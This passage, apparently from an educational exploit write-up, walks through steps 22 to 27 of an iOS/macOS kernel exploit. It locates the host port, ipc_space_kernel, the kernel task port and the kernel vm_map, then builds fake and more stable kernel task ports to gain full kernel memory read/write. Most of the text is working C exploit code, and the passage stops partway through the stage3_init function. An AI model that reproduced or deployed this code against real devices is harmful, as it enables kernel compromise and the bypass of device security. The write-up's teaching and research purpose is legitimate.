&lt;p&gt;We need to get the host port address first using which we can find the &lt;strong&gt;ipc_space_kernel&lt;/strong&gt; in later steps. In order to achieve a full kernel read/write, we need to find kernel &lt;strong&gt;vm_map&lt;/strong&gt; and the kernel &lt;strong&gt;ipc_space&lt;/strong&gt;. Since the &lt;strong&gt;ipc_space_kernel&lt;/strong&gt; can be identified using the host port’s receiver field, it is essential to find the address of the host port.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;c1&quot;&gt;// 22\. Our next goal is to build a fake kernel_task port that allows us to read and write&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// kernel memory with mach_vm_read()/mach_vm_write(). But in order to do that, we'll first&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// need to get ipc_space_kernel and kernel_map. We'll use Ian's technique from multi_path&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// for this.&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// First things first, get the address of the host port.&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host_port_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stage1_find_port_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;step-23-get-ipc_space_kernel-from-the-host-ports-ip_receiver&quot;&gt;Step 23: Get ipc_space_kernel from the host port’s ip_receiver&lt;/h4&gt;

&lt;p&gt;Recall from Part 1 that the &lt;strong&gt;ipc_port&lt;/strong&gt; struct has a receiver field which points to the ipc_space. We can read the &lt;strong&gt;ipc_space_kernel&lt;/strong&gt; by reading the host ports &lt;strong&gt;ip_receiver&lt;/strong&gt; field.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;c1&quot;&gt;// 23\. We can get ipc_space_kernel from the host port's ip_receiver.&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host_port_ip_receiver&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host_port_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OFFSET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_receiver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_space_kernel&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stage1_read64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host_port_ip_receiver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;step-24-get-the-address-of-the-kernel-task-port&quot;&gt;Step 24: Get the address of the kernel task port&lt;/h4&gt;

&lt;p&gt;The next step is to find the kernel &lt;strong&gt;vm_map&lt;/strong&gt;, and to do that we can first find the kernel task port and from there onwards get the &lt;strong&gt;vm_map&lt;/strong&gt; at a fixed offset. In the heap, the kernel task port would be near to the host port, so therefore we can iterate into that particular block as task ports and identify the kernel task port and subsequently get the kernel &lt;strong&gt;vm_map&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;c1&quot;&gt;// 24\. Now we'll iterate through all the ports in the host port's block to try and find the&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// kernel task port, which will give us the address of the kernel task.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;kernel_task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_block&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host_port_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BLOCK_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;iterate_ipc_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BLOCK_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;candidate_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_block&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;found&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stage1_check_kernel_task_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;candidate_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    		&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stop&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;found&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Make sure we got the kernel_task's address.&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel_task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;could not find kernel_task port&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;fail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;INFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;kernel_task is at 0x%016llx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The following function checks whether a port is a kernel task port or not. It first looks up the bits field to see if it is of type &lt;strong&gt;IKOT_TASK&lt;/strong&gt; to identify whether it is a task port. It then reads the address pointed to by the &lt;strong&gt;kobject&lt;/strong&gt; field which is the corresponding task, looks up the &lt;strong&gt;bsd_info&lt;/strong&gt; field in that task to find the &lt;strong&gt;proc&lt;/strong&gt; structure it is pointing to, and then reads the &lt;strong&gt;pid&lt;/strong&gt; value. If it is &lt;strong&gt;0&lt;/strong&gt; this means it is the kernel task port.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;cm&quot;&gt;/*
     * stage1_check_kernel_task_port
     *
     * Description:
     * 	Check if the given ipc_port is a task port for the kernel task.
     */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;stage1_check_kernel_task_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;candidate_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel_task_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Check the ip_bits field.&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_bits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stage1_read32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;candidate_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OFFSET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_bits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_bits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;io_makebits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOT_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_TASK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// This is a task port. Get the task.&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stage1_read64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;candidate_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OFFSET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_kobject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Now get the task's PID.&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stage1_read64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OFFSET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bsd_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stage1_read32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OFFSET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p_pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// The kernel task has pid 0.&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Found it!&lt;/span&gt;
    	&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel_task_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;step-25-get-the-address-of-the-vm_map&quot;&gt;Step 25: Get the address of the vm_map&lt;/h4&gt;

&lt;p&gt;Now that we have identified the kernel task port, we can read the &lt;strong&gt;vm_map&lt;/strong&gt; since it is at a fixed offset.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;c1&quot;&gt;// 25\. Next we can use the kernel task to get the address of the kernel vm_map.&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_map&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stage1_read64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel_task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OFFSET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;step-26-create-a-fake-kernel-task-port&quot;&gt;Step 26: Create a fake kernel task port&lt;/h4&gt;

&lt;p&gt;Now we can build a fake kernel task port, all of which is still within the pipe buffer.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;c1&quot;&gt;// 26\. Build a fake kernel task port that allows us to read and write kernel memory.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;stage2_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_space_kernel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The criteria for a fake kernel task port is that the fake task’s map field should point to the kernel &lt;strong&gt;vm_map&lt;/strong&gt; and the receiver field should point to the &lt;strong&gt;ipc_space_kernel&lt;/strong&gt;. This is acheived with the following 2 lines.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;n&quot;&gt;FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_port_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_receiver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;   &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_space_kernel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;step-27-create-a-fake-kernel-task-port&quot;&gt;Step 27: Create a fake kernel task port&lt;/h4&gt;

&lt;p&gt;Now that we have a fully functioning kernel task port and we can call the Mach APIs to read and write memory, it is time to build a more stable kernel task port. This time, memory is allocated via &lt;strong&gt;mach_vm_allocate&lt;/strong&gt; and the kernel task port may be created even outside the pipe buffer.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;c1&quot;&gt;// 27\. Alright, now kernel_read() and kernel_write() should work, so let's build a safer&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// kernel_task port. This also cleans up fake_port so that we (hopefully) won't panic on&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// exit.&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_pointer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_port_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OFFSET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_kobject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;current_task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_read64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task_pointer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;stage3_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_space_kernel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/*
     * stage3_init
     *
     * Description:
     * 	Initialize the stage 3 kernel read/write primitives. After this, it's safe to free all
     * 	other resources.
     *
     * 	TODO: In the future we should use mach_vm_remap() here to actually get a second copy of the
     * 	real kernel_task.
     */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;stage3_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_space_kernel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;success&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x800&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Allocate some virtual memory.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;mach_vm_address_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_vm_allocate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VM_FLAGS_ANYWHERE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s returned %d: %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;mach_vm_allocate&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_error_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    		&lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fail_0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Build the contents we want.&lt;/span&gt;
